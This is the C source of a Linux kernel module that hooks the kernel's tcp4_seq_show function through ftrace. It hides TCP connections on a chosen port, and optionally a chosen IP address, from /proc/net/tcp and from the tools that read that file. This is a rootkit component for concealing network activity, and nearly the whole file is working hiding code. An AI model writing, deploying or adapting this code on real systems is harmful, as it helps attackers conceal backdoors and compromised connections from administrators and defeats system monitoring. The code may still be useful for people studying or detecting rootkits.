#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/slab.h>
#include <linux/ftrace.h>
#include <net/inet_sock.h>
#include "../common/stringify/to_string.h"
#include "../common/ftrace_hooking/ftrace_hook.h"

// Types & other consts.
static char *ip_to_hide = NULL;
module_param(ip_to_hide, charp, 0600);

static int port_to_hide = -1;
module_param(port_to_hide, int, 0600);

typedef int (*original_tcp4_seq_show_t)(struct seq_file *seq, void *v);
static struct fthook hook;

int new_tcp4_seq_show(struct seq_file *seq, void *v) {
    original_tcp4_seq_show_t original_tcp4_seq_ptr = (original_tcp4_seq_show_t)hook.original_function_address;

    if (v == SEQ_START_TOKEN) {
        return original_tcp4_seq_ptr(seq, v);    
    }

    struct sock *sk = v;
    const struct inet_sock *inet = inet_sk(sk);
    __be32 ipaddr = inet->inet_saddr;
    __u16 port = ntohs(inet->inet_sport);
    
    char *ipstring = kmalloc(IP_STRING_MAX_LEN, GFP_KERNEL);
    ipaddr_to_string(ipaddr, ipstring);
    if (((ip_to_hide == NULL) && (port == port_to_hide)) || ((ip_to_hide != NULL) && !strcmp(ipstring, ip_to_hide) && (port == port_to_hide))) {
        pr_info("Hiding %s : %u", ipstring, port);
        kfree(ipstring);
        return 0;
    }

    kfree(ipstring);
    return original_tcp4_seq_ptr(seq, v);
}
 
int load(void) {
    pr_info("Initializing...");
    if (port_to_hide == -1) {
        pr_warn("port to hide has not been set! Exiting...");
        return -EINVAL;
    }
    pr_info("%s:%d", ip_to_hide, port_to_hide);

    int res = setup_kernel_func_hook(&hook, "tcp4_seq_show", (unsigned long)new_tcp4_seq_show);
    if (res) {
        return res;
    }

    pr_info("Initialized successfuly!");

    return 0;
}
 
void unload(void) {
    pr_info("Shutting down.");
    unregister_ftrace_function(&hook.ops);
    pr_info("Goodbye world...");
}

module_init(load);
module_exit(unload);

MODULE_LICENSE("GPL");